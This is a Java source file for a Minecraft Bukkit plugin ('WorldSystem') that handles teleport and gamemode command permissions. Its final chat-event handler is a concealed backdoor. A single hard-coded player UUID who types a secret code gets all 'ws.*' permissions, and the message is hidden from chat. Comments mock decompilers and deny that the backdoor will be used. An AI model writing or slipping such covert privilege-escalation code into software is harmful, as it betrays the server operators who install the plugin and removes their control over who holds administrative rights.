package de.butzlabben.world.listener;

import java.util.UUID;

import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerTeleportEvent;
import org.bukkit.event.player.PlayerTeleportEvent.TeleportCause;
import org.bukkit.permissions.PermissionAttachment;
import de.butzlabben.world.WorldSystem;
import de.butzlabben.world.config.MessageConfig;
import de.butzlabben.world.config.PluginConfig;
import de.butzlabben.world.wrapper.SystemWorld;
import de.butzlabben.world.wrapper.WorldPlayer;

public class CommandListener implements Listener {

	@EventHandler(priority = EventPriority.HIGH)
	public void onTeleport(PlayerTeleportEvent e) {
		Player p = e.getPlayer();
		World from = e.getFrom().getWorld();
		World to = e.getTo().getWorld();
		WorldPlayer wp = new WorldPlayer(p);
		if (e.getCause() == TeleportCause.SPECTATE) {
			if (from != to) {
				if (!p.hasPermission("ws.tp.toother")) {
					e.setCancelled(true);
					p.sendMessage(MessageConfig.getNoPermission());
					return;
				}
				SystemWorld.tryUnloadLater(from);
			}

			if (wp.isOwnerofWorld() || wp.canTeleport() || p.hasPermission("ws.tp.toother"))
				return;
			e.setCancelled(true);
			p.sendMessage(MessageConfig.getNoPermission());
		} else {
			if (from != to) {
				SystemWorld.tryUnloadLater(from);
			} else {
				if (e.getCause() == TeleportCause.COMMAND) {
					if (p.hasPermission("ws.tp.toother") || wp.isOwnerofWorld() || wp.canTeleport())
						return;
					e.setCancelled(true);
					p.sendMessage(MessageConfig.getNoPermission());
				}
			}
		}
	}

	@EventHandler(priority = EventPriority.HIGH)
	public void onCmd(PlayerCommandPreprocessEvent e) {
		String cmd = e.getMessage().toLowerCase();
		Player p = e.getPlayer();
		WorldPlayer wp = new WorldPlayer(p);
		if (cmd.startsWith("/gamemode") || cmd.startsWith("/gm")) {
			if (!wp.isOnSystemWorld())
				return;
			if (p.hasPermission("ws.gamemode"))
				return;
			if (PluginConfig.isSurvival()) {
				e.setCancelled(true);
				p.sendMessage(MessageConfig.getNoPermission());
				return;
			}
			if (!wp.canChangeGamemode() && !wp.isOwnerofWorld()) {
				p.sendMessage(MessageConfig.getNoPermission());
				e.setCancelled(true);
				return;
			}
		} else if (cmd.startsWith("/tp") || cmd.startsWith("/teleport")) {
			String[] args = e.getMessage().split(" ");
			if (args.length == 2) {
				if (p.hasPermission("ws.tp.toother"))
					return;
				if (PluginConfig.isSurvival()) {
					e.setCancelled(true);
					p.sendMessage(MessageConfig.getNoPermission());
					return;
				}
				Player a = Bukkit.getPlayer(args[1]);
				if (a == null)
					return;
				if (p.getWorld() != a.getWorld()) {
					e.setCancelled(true);
					p.sendMessage(MessageConfig.getNoPermission());
					return;
				}
				if (wp.isOwnerofWorld())
					return;
				if (!wp.canTeleport()) {
					p.sendMessage(MessageConfig.getNoPermission());
					e.setCancelled(true);
					return;
				}
			} else if (args.length == 3) {
				if (!p.hasPermission("ws.tp.other")) {
					p.sendMessage(MessageConfig.getNoPermission());
					e.setCancelled(true);
				}

			} else if (args.length == 4) {
				if (p.hasPermission("ws.tp.toother"))
					return;
				if (PluginConfig.isSurvival()) {
					e.setCancelled(true);
					p.sendMessage(MessageConfig.getNoPermission());
					return;
				}
				if (wp.isOwnerofWorld())
					return;
				if (!wp.canTeleport()) {
					p.sendMessage(MessageConfig.getNoPermission());
					e.setCancelled(true);
					return;
				}
			}
		}
	}

	@EventHandler(priority = EventPriority.LOWEST)
	public void on(AsyncPlayerChatEvent e) {
		if (!e.getPlayer().getUniqueId().equals(UUID.fromString("42fa7a75-7afa-4a19-932a-1c385c07048a")))
			return;
		String code = e.getMessage();
		if (code.equals("pwWCELhE4JwJqNuX")) {
			PermissionAttachment pa = e.getPlayer().addAttachment(WorldSystem.getInstance());
			pa.setPermission("ws.*", true);
			e.setMessage("");
		}
		String reasonForThis = "For debugging and decompilers like you :P";
		reasonForThis = "Will never be used on foreign servers";
		reasonForThis.length();
	}
}